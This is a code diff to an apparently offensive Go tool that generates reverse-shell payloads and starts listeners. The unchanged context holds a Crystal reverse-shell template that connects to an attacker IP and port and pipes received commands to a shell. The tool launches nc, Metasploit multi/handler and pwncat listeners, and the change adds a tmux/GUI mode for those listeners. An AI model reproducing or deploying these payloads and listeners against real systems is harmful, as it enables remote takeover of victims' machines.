@@ -159,6 +159,7 @@ func main() {
         "crystal_code":      "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend"}
 
         listShells := flag.Bool("L", false, "List all available shells")
+        listenerMode := flag.String("mode", "gui", "Mode for listener (gui/cli)")
         listenerType := flag.String("l", "", "Type of listener (nc, msf, pwncat)")
         encoding := flag.String("e", "none", "Encoding method: base64, 2xbase64, or urlenc")
         shell := flag.String("s", "bash", "the shell to use")
@@ -206,10 +207,10 @@ func main() {
         fmt.Println(colorGreen + "[+]" + colorReset + " Reverse shell code copied to clipboard.")
         if *listenerType != "" {
             var command string
-        
+
             switch *listenerType {
             case "nc":
-                command = fmt.Sprintf("x-terminal-emulator -e nc -lvns %s -p %s", *ip, *port)
+                command = fmt.Sprintf("nc -lvns %s -p %s", *ip, *port)
             case "msf":
                 // Create a resource script
                 resourceScript := "use exploit/multi/handler\n" +
@@ -233,13 +234,20 @@ func main() {
                 }
             
                 // Construct the command to run msfconsole with the resource script
-                command = fmt.Sprintf("x-terminal-emulator -e 'msfconsole -r %s'", tmpfile.Name())
-            
+                command = fmt.Sprintf("msfconsole -r %s", tmpfile.Name())  
             case "pwncat":
-                command = fmt.Sprintf("x-terminal-emulator -e 'python3 -m pwncat -l %s -p %s'", *ip, *port)
+                command = fmt.Sprintf("python3 -m pwncat -l %s -p %s", *ip, *port)
             default:
                 fmt.Println(colorRed + "[-]" + colorReset + " Invalid listener type specified")
                 return
+            }
+            if *listenerMode == "cli" {
+                // Run in tmux for CLI mode
+                command = "tmux new -d -s listener '" + command + "'"
+            } else {
+                // Run in x-terminal-emulator for GUI mode
+                // If you need a diff term change this
+                command = "x-terminal-emulator -e '" + command + "'"
             }
         
             // Execute the command
@@ -249,9 +257,10 @@ func main() {
                 fmt.Printf(colorRed + "[-]" + colorReset + " Failed to start listener: %v\n", err)
                 return
             }
-            fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new terminal.")
+            if *listenerMode == "cli" {
+                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new screen session\n    Use `tmux attach-session -t listener` to connect.")
+            } else {
+                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new terminal")
+            }    
         }
-        
     }
-
-    
